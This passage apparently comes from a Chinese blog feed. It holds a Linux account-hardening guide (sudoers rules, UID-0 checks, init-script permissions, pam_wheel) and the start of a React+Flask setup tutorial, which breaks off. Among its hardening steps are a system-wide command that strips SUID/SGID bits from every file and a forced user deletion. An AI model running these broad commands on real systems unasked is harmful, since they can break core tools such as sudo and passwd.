class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"System maintenance in progress. Please try again later."</span> <span class="token operator">&gt;</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将会在 <code>/etc/nologin</code> 文件中写入一条消息，告知用户系统正在进行维护。</p><p>请注意，创建 <code>/etc/nologin</code> 文件是一个影响所有非 root 用户的操作，因此在执行此操作之前应该谨慎考虑，并确保所有受影响的用户都得到了适当的通知。</p><h1 id="五、账户权限控制"><a href="#五、账户权限控制" class="headerlink" title="五、账户权限控制"></a>五、账户权限控制</h1><h2 id="5-1-etc-sudoers简介"><a href="#5-1-etc-sudoers简介" class="headerlink" title="5.1 /etc/sudoers简介"></a>5.1 /etc/sudoers简介</h2><p><code>/etc/sudoers</code> 文件是 Unix 和类 Unix 系统中用于定义哪些用户可以执行哪些命令以及他们可以在哪台机器上执行这些命令的核心配置文件。这个文件是 sudo 工具的基础，sudo 允许授权的用户以其他用户的安全权限执行命令，默认情况下是以超级用户（root）的权限执行。</p><p>编辑 <code>/etc/sudoers</code> 文件需要非常小心，因为错误的配置可能导致系统无法正常使用 sudo 命令。推荐使用 <code>visudo</code> 命令来编辑这个文件，因为 <code>visudo</code> 会在保存前检查语法错误，从而防止配置错误。</p><h2 id="5-2-sudders配置示例"><a href="#5-2-sudders配置示例" class="headerlink" title="5.2 sudders配置示例"></a>5.2 sudders配置示例</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 允许用户 alice 从任何主机执行任何命令，不需要密码</span>alice <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL<span class="token comment"># 允许用户 bob 仅在本地主机执行命令，需要密码</span>bob <span class="token assign-left variable">localhost</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 允许整个 wheel 组的用户在任何主机上执行命令，需要密码</span>%wheel <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 定义一个命令别名，例如定义一个只允许重启服务的别名</span>Cmnd_Alias REBOOT <span class="token operator">=</span> /sbin/shutdown <span class="token parameter variable">-r</span> now, /sbin/reboot<span class="token comment"># 允许用户 carol 执行 REBOOT 别名中的命令，不需要密码</span>carol <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: REBOOT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.38.50.png" style="zoom:30%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zhangsan <span class="token assign-left variable">ALL</span><span class="token operator">=</span>NOPASSWD: /bin/passwd, <span class="token operator">!</span>/bin/passwd root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>zhangsan**：这是用户名，表示这个配置规则适用于名为 <code>zhangsan</code> 的用户。</li><li><strong>ALL</strong>：这表示该规则适用于所有主机。<code>zhangsan</code> 用户可以在任何主机上使用以下命令。</li><li><strong>=NOPASSWD</strong>：这是一个选项，表示在执行后面的命令时，不需要输入密码。<code>NOPASSWD</code> 是一个常用的 sudo 选项，用于提高便利性，但需要注意这可能会带来安全风险。</li><li><strong>/bin/passwd</strong>：这是一个命令别名，通常用于更改用户密码。在这里，它允许 <code>zhangsan</code> 用户更改任何用户的密码，包括自己的。</li><li><strong>!/bin/passwd root</strong>：这里的感叹号 <code>!</code> 表示否定，即 <code>zhangsan</code> 用户不允许使用 <code>/bin/passwd</code> 命令来更改 root 用户的密码。</li></ol><p>综合来看，这行配置允许用户 <code>zhangsan</code> 在所有主机上更改任何用户的密码，但有一个例外：<code>zhangsan</code> 不能更改 root 用户的密码，即使不需要输入密码。这种配置可以用于赋予特定用户管理其他用户密码的权限，同时保留对 root 密码的控制权。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行赋予 root 用户在所有主机（ALL）上以任何用户身份（ALL）执行任何命令（ALL）的权限。</span>%admin <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行允许 admin 组的所有成员在所有主机上执行任何命令。% 符号用于表示组，而不是单个用户。</span>%sudo   <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行允许 sudo 组的成员在所有主机上以任何用户身份执行任何命令。</span>@includedir /etc/sudoers.d<span class="token comment"># 这一行是一个指令，告诉 sudo 去 /etc/sudoers.d 目录下包含额外的配置文件。这些文件通常用于为个别用户或组设置更精细的权限，而不必编辑主 /etc/sudoers 文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>root    ALL=(ALL:ALL) ALL</li></ul><ol><li><strong>root</strong>：这是用户名，表示这个配置规则适用于 root 用户。</li><li><strong>ALL</strong>：这是主机（或主机组）的指定，表示这个规则适用于所有主机。当你想要为特定主机或一组主机设置权限时，你可以在这里指定主机名或使用通配符。</li><li>**=(ALL:ALL)**：这是委托（Delegation）部分，它定义了用户可以以哪些用户的身份执行命令。<ul><li>**(ALL:ALL)**：括号内的部分表示用户可以以所有用户（ALL）的身份在所有组（ALL）中执行命令。这意味着 root 用户可以切换到任何用户和组。</li></ul></li><li><strong>ALL</strong>：这是命令的指定，表示这个规则适用于所有命令。也就是说，root 用户可以执行任何命令。</li></ol><p>综合来看，这个条目意味着 root 用户在所有主机上可以以任何用户的身份执行任何命令。这是 root 用户的默认权限，通常不需要在 <code>/etc/sudoers</code> 文件中显式写出，因为 root 用户默认就有所有权限。但是，为了清晰和完整性，有时管理员会在 <code>/etc/sudoers</code> 文件中显式地声明这一点。</p><ul><li>主机的概念</li></ul><p>在 <code>/etc/sudoers</code> 文件中的 “主机”（Host）指定部分，指的是 sudo 命令可以被执行的计算机或服务器。这个概念允许管理员为不同的机器设置不同的权限规则。以下是一些具体的例子：</p><ol><li><strong>特定主机</strong>：你可以为特定的主机设置 sudo 权限。例如，<code>user host1=(ALL) ALL</code> 表示用户在名为 <code>host1</code> 的主机上可以执行任何命令。</li><li><strong>所有主机</strong>：使用 <code>ALL</code> 表示规则适用于所有主机。例如，<code>user ALL=(ALL) ALL</code> 允许用户在所有主机上执行任何命令。</li><li><strong>主机组</strong>：在某些系统中，你可以定义主机组，并为整个组设置权限。例如，如果你有一个名为 <code>webservers</code> 的主机组，你可以设置 <code>user @webservers=(ALL) ALL</code> 来允许用户在所有属于 <code>webservers</code> 组的主机上执行命令。</li><li><strong>IP 地址</strong>：你也可以使用 IP 地址来指定主机。例如，<code>user 192.168.1.100=(ALL) ALL</code> 允许用户在 IP 地址为 <code>192.168.1.100</code> 的主机上执行命令。</li><li><strong>网络范围</strong>：使用网络范围指定主机，如 <code>user 192.168.1.%=(ALL) ALL</code> 允许用户在 <code>192.168.1.</code> 网络范围内的所有主机上执行命令。</li></ol><p>在远程管理多个服务器的环境中，这种灵活性允许管理员为不同的服务器设置不同的访问控制策略，以增强安全性和管理效率。</p></blockquote><h2 id="5-3-查找除root之外uid为0的用户并将其删除"><a href="#5-3-查找除root之外uid为0的用户并将其删除" class="headerlink" title="5.3 查找除root之外uid为0的用户并将其删除"></a>5.3 查找除root之外uid为0的用户并将其删除</h2><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.50.14.png" style="zoom:50%;"><blockquote><ul><li>这个命令使用 <code>awk</code> 工具来处理 <code>/etc/passwd</code> 文件。<code>/etc/passwd</code> 是一个存储系统用户账户信息的文件。</li><li><code>-F:</code> 指定了字段分隔符为冒号 <code>:</code>。</li><li><code>($3==0)</code> 是一个条件表达式，检查第三个字段（用户 ID，通常是 <code>UID</code>）是否为0。在 Unix 和类 Unix 系统中，UID 为0通常表示 root 用户。</li><li><code>{print $1}</code> 如果条件为真，则打印出第一个字段，即用户名。</li><li>但是，这个命令有一个语法错误。正确的命令应该是 <code>awk -F: '$3==0 {print $1}' /etc/passwd</code>，这样它会打印出所有 UID 为0的用户名。</li></ul></blockquote><p>如果发现test用户uid为0，将其删除：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">userdel</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-f</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令用于删除用户 <code>test</code>。</li><li><code>-r</code> 选项表示同时删除用户的家目录和邮件队列。</li><li><code>-f</code> 选项表示强制删除用户，即使用户当前登录也不会影响删除操作。</li></ul><h2 id="5-4-高权限文件"><a href="#5-4-高权限文件" class="headerlink" title="5.4 高权限文件"></a>5.4 高权限文件</h2><h3 id="5-4-1-检查是否有文件存在过高的权限"><a href="#5-4-1-检查是否有文件存在过高的权限" class="headerlink" title="5.4.1 检查是否有文件存在过高的权限"></a>5.4.1 检查是否有文件存在过高的权限</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-0007</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">ls</span> <span class="token parameter variable">-lh</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>：从根目录 <code>/</code> 开始查找所有类型为文件的项。</li><li><code>(-perm -0007)</code>：查找权限为 7（即所有用户都有读、写、执行权限）的文件。</li><li><code>xargs -I {} ls -lh {}</code>：对找到的每个文件执行 <code>ls -lh</code> 命令，显示详细信息，包括文件权限、所有者、大小和修改日期。</li></ul></blockquote><h3 id="5-4-2-去掉所有文件的-SUID-和-SGID"><a href="#5-4-2-去掉所有文件的-SUID-和-SGID" class="headerlink" title="5.4.2 去掉所有文件的 SUID 和 SGID"></a>5.4.2 去掉所有文件的 SUID 和 SGID</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-o</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-2000</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">chmod</span> ug-s <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>：同样从根目录开始查找所有文件。</li><li><code>(-perm -4000 -o -perm -2000)</code>：查找设置了 SUID（4000）或 SGID（2000）位的文件。</li><li><code>xargs -I {} chmod ug-s {}</code>：对找到的每个文件执行 <code>chmod ug-s</code> 命令，移除 SUID 和 SGID 位。</li></ul></blockquote><h2 id="5-5-禁止使用任意用户-rlogin-登录"><a href="#5-5-禁止使用任意用户-rlogin-登录" class="headerlink" title="5.5 禁止使用任意用户 rlogin 登录"></a>5.5 禁止使用任意用户 rlogin 登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /dev/null <span class="token operator">&gt;</span> /root/.rhosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>cat /dev/null</code>：创建一个空文件。</li><li><code>&gt; /root/.rhosts</code>：将这个空文件重定向到 <code>/root/.rhosts</code>。这个文件用于控制哪些远程用户可以通过 rlogin 访问 root 用户。清空这个文件可以防止任何用户通过 rlogin （远程登录）登录为 root。</li></ul><p>这些命令用于增强系统的安全性，通过限制权限和控制访问来减少潜在的安全风险。</p></blockquote><h2 id="5-6-启动脚本文件权限管理"><a href="#5-6-启动脚本文件权限管理" class="headerlink" title="5.6 启动脚本文件权限管理"></a>5.6 启动脚本文件权限管理</h2><ol><li><strong>任务描述</strong>：检查并修复启动脚本文件权限，以防止潜在的安全漏洞，如未授权访问或恶意软件（木马）的植入。</li><li><strong>命令和输出</strong>：<ul><li><code>ls -l /etc/rc.d/init.d</code>：列出 <code>/etc/rc.d/init.d</code> 目录下的所有文件及其权限。这个目录通常包含系统启动时运行的脚本。</li><li>输出显示了多个文件的权限，其中一些文件具有 <code>rwx</code>（读、写、执行）权限，这意味着所有用户都可以执行这些脚本，这可能是一个安全风险。</li></ul></li><li><strong>修复命令</strong>：<ul><li><code>chmod 700 /etc/rc.d/init.d/*</code>：将 <code>/etc/rc.d/init.d</code> 目录下所有文件的权限更改为 <code>700</code>，这意味着只有文件所有者（通常是 root）可以读取、写入和执行这些文件，增强安全性。</li></ul></li></ol><h2 id="5-7-限制用户使用-su-切换到-root"><a href="#5-7-限制用户使用-su-切换到-root" class="headerlink" title="5.7 限制用户使用 su 切换到 root"></a>5.7 限制用户使用 <code>su</code> 切换到 root</h2><ol><li><strong>任务描述</strong>：配置系统以限制只有特定组（如 wheel 组）的用户才能使用 <code>su</code> 命令切换到 root 用户。</li><li><strong>配置步骤</strong>：<ul><li>编辑 <code>/etc/pam.d/su</code> 文件，添加 <code>auth required pam_wheel.so group=wheel</code>。这行配置确保只有 wheel 组的成员才能使用 <code>su</code> 命令切换到 root。</li></ul></li><li><strong>验证步骤</strong>：<ul><li>使用 <code>grep wheel /etc/group</code> 检查 wheel 组的成员。输出显示 <code>zhangsan</code> 是 wheel 组的成员。</li><li>尝试使用 <code>su -l root</code> 命令切换到 root 用户。<code>zhangsan</code> 成功切换到 root，而 <code>lisi</code> 因为不是 wheel 组的成员，尝试失败并收到 “Permission denied” 的消息。</li></ul></li></ol><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>Linux系统账户安全加固对于保护服务器和数据至关重要。通过限制SUID和SGID位，可以防止恶意程序获取过高权限；严格管理文件权限，避免未授权访问；使用<code>chmod</code>命令限制启动脚本的访问权限，防止恶意代码执行。此外，通过配置<code>/etc/pam.d/su</code>文件，限制只有特定用户组能使用<code>su</code>切换到root，进一步增强安全性。这些措施共同构建了一个更加安全的环境，防止未授权访问、数据泄露和系统被恶意软件感染，确保系统稳定性和数据完整性。</p>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
            <tag> Linux安全加固 </tag>
            
            <tag> 账户安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React+Flask前后端分离开发</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="一、动机"><a href="#一、动机" class="headerlink" title="一、动机"></a>一、动机</h1><p>通过 <strong>React</strong>（前端框架）和 <strong>Flask</strong>（后端框架）构建一个初始网站，可以结合它们的优势，前端负责交互界面，后端提供 API 接口。</p><h1 id="二、准备环境"><a href="#二、准备环境" class="headerlink" title="二、准备环境"></a>二、准备环境</h1><h2 id="2-1-安装必要工具"><a href="#2-1-安装必要工具" class="headerlink" title="2.1 安装必要工具"></a>2.1 安装必要工具</h2><ul><li>确保安装了 <a href="https://nodejs.org/">Node.js</a> 和 npm，用于管理 React 项目。</li><li>确保安装了 Python（推荐 3.8 及以上版本）和 pip，用于管理 Flask 项目。</li></ul><blockquote><h3 id="npm是什么？"><a href="#npm是什么？" class="headerlink" title="npm是什么？"></a>npm是什么？</h3><p>npm 是 Node Package Manager（节点包管理器）的缩写，它是 JavaScript 运行时环境 Node.js 的默认包管理器。</p><p>npm 用于管理和安装 Node.js 应用程序所需的各种代码库和工具，这些代码库和工具被称为“包”或“模块”。</p><p>以下是 npm 的一些主要功能：</p><ol><li><strong>依赖管理</strong>：npm 允许你为你的项目定义依赖关系，并通过 <code>package.json</code> 文件来管理这些依赖。这使得项目可以轻松地在不同的开发环境中共享和部署。</li><li><strong>包安装</strong>：你可以使用 npm 来安装项目所需的包。这些包可以是第三方库，也可以是你自己的代码模块。</li><li><strong>版本控制</strong>：npm 支持语义化版本控制，允许你指定依赖的版本范围，以确保兼容性。</li><li><strong>包发布</strong>：开发者可以将自己的包发布到 npm 的公共仓库，供其他开发者使用。</li><li><strong>全局安装</strong>：npm 允许你全局安装包，这样你就可以在任何地方使用这些工具，而不需要在每个项目中单独安装。</li><li><strong>脚本</strong>：<code>package.json</code> 文件中的 <code>scripts</code> 字段允许你定义自定义脚本，这些脚本可以通过 <code>npm run &lt;script-name&gt;</code> 来执行。</li><li><strong>工作区</strong>：npm 支持工作区，允许你在多个包之间共享配置和依赖。</li></ol></blockquote><h1 id="三、创建-Flask-后端"><a href="#三、创建-Flask-后端" class="headerlink" title="三、创建 Flask 后端"></a>三、创建 Flask 后端</h1><h2 id="3-1-创建-Flask-项目"><a href="#3-1-创建-Flask-项目" class="headerlink" title="3.1 创建 Flask 项目"></a>3.1 创建 Flask 项目</h2><p>初始化 Flask 项目目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> flask-backend<span class="token builtin class-name">cd</span> flask-backend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-创建虚拟环境并激活"><a href="#3-2-创建虚拟环境并激活" class="headerlink" title="3.2 创建虚拟环境并激活"></a>3.2 创建虚拟环境并激活</h2><p>conda 或 venv</p><h3 id="3-2-1-anaconda"><a href="#3-2-1-anaconda" class="headerlink" title="3.2.1 anaconda"></a>3.2.1 anaconda</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.27.59.png" style="zoom:50%;"><h3 id="3-2-2-venv"><a href="#3-2-2-venv" class="headerlink" title="3.2.2 venv"></a>3.2.2 venv</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> venv venv<span class="token builtin class-name">source</span> venv/bin/activate   <span class="token comment"># Windows: venv\Scripts\activate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-安装-Flask"><a href="#3-2-3-安装-Flask" class="headerlink" title="3.2.3 安装 Flask"></a>3.2.3 安装 Flask</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-创建-app-py-文件"><a href="#3-2-4-创建-app-py-文件" class="headerlink" title="3.2.4 创建 app.py 文件"></a>3.2.4 创建 <code>app.py</code> 文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-5-启动-Flask-服务器"><a href="#3-2-5-启动-Flask-服务器" class="headerlink" title="3.2.5 启动 Flask 服务器"></a>3.2.5 启动 Flask 服务器</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.34.25.png" style="zoom:50%;"><p>访问 <code>http://127.0.0.1:5000/api/message</code>：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.35.40.png" style="zoom:50%;"><h1 id="四、创建-React-前端"><a href="#四、创建-React-前端" class="headerlink" title="四、创建 React 前端"></a>四、创建 React 前端</h1><h2 id="4-1-初始化-React-项目"><a href="#4-1-初始化-React-项目" class="headerlink" title="4.1 初始化 React 项目"></a>4.1 初始化 React 项目</h2><p>在另一个目录中创建 React 项目</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-frontend<span class="token builtin class-name">cd</span> react-frontend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ul><li>命令解析：</li></ul><p>**<code>npx</code>**是 npm 的一部分，用于运行 npm 包而无需全局安装它们。</p><p>**<code>create-react-app</code>**是 React 官方提供的脚手架工具，用于快速搭建 React 项目的初始结构。</p><p>**<code>react-frontend</code>**是项目的目录名称，你可以根据需要自定义，例如 <code>my-react-app</code>。</p></blockquote><blockquote><p> 报错：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.44.29.png" alt="截屏2024-12-09 17.44.29" style="zoom:50%;"><p>try：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> legacy-peer-deps <span class="token boolean">true</span><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参考：<a href="https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia">https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia</a></p><p><code>npm config set legacy-peer-deps true</code></p><p>这条命令用于配置 <strong>npm</strong> 使用 “legacy peer dependencies” 机制来解决依赖冲突。具体来说：</p><ol><li><strong><code>peer dependencies</code></strong><br>是指某个 npm 包对其他包的版本要求，它并不直接安装这些依赖，而是由使用该包的项目来安装。它用于确保在多个包中共享同一版本的依赖。</li><li><strong>“legacy peer dependencies”</strong><br>在 npm 7 版本及之后，npm 会强制执行严格的 <code>peer dependencies</code> 规则。若存在不兼容的版本，npm 会拒绝安装。这可能导致一些旧项目的依赖安装失败，特别是一些老旧的 npm 包没有更新以适应这些新规则。</li><li><strong><code>npm config set legacy-peer-deps true</code></strong><br>这条命令设置 npm 配置，指示 npm 在安装时忽略 <code>peer dependencies</code> 的严格检查，允许安装不完全匹配的版本。这对于那些依赖较旧的 npm 包（或者在升级后依赖有冲突的情况）特别有用。</li></ol><p><code>npm i</code> (或 <code>npm install</code>)**</p><p>这是用于安装项目依赖的命令，它会按照项目根目录下的 <code>package.json</code> 文件来安装所有列出的依赖。</p><ul><li>在执行 <code>npm i</code> 时，npm 会下载并安装依赖到项目的 <code>node_modules</code> 目录。</li><li>如果你在之前执行过 <code>npm config set legacy-peer-deps true</code>，npm 会在安装过程中忽略 <code>peer dependencies</code> 的严格检查，允许版本冲突的依赖继续安装。</li></ul></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.51.41.png" style="zoom:40%;"><p>启动服务并访问测试：</p><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.18.39.png" alt="截屏2024-12-10 09.18.39"></p><p>bug处理：</p><blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.21.15.png" alt="截屏2024-12-10 09.21.15" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.53.02.png" alt="截屏2024-12-09 17.53.02" style="zoom:50%;"><p>安装缺失的库。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">npm install <span class="token operator">--</span>save<span class="token operator">-</span>dev web<span class="token operator">-</span>vitals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>重新运行npm start启动前端项目。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.22.17.png" style="zoom:30%;"><h2 id="4-2-修改-React-项目以调用-Flask-API"><a href="#4-2-修改-React-项目以调用-Flask-API" class="headerlink" title="4.2 修改 React 项目以调用 Flask API"></a>4.2 修改 React 项目以调用 Flask API</h2><h3 id="4-2-1-安装-axios（用于发起-HTTP-请求）"><a href="#4-2-1-安装-axios（用于发起-HTTP-请求）" class="headerlink" title="4.2.1 安装 axios（用于发起 HTTP 请求）"></a>4.2.1 安装 <code>axios</code>（用于发起 HTTP 请求）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> axios<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.27.40.png" style="zoom:50%;"><h3 id="4-2-2-在-src-App-js-中编辑代码"><a href="#4-2-2-在-src-App-js-中编辑代码" class="headerlink" title="4.2.2 在 src/App.js 中编辑代码"></a>4.2.2 在 <code>src/App.js</code> 中编辑代码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>message<span class="token punctuation">,</span> setMessage<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token comment">// 调用 Flask API</span>        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:5000/api/message'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token function">setMessage</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error fetching data:"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">textAlign</span><span class="token operator">:</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token literal-property property">marginTop</span><span class="token operator">:</span> <span class="token string">'50px'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>React <span class="token operator">+</span> Flask 初始页面<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>            <span class="token 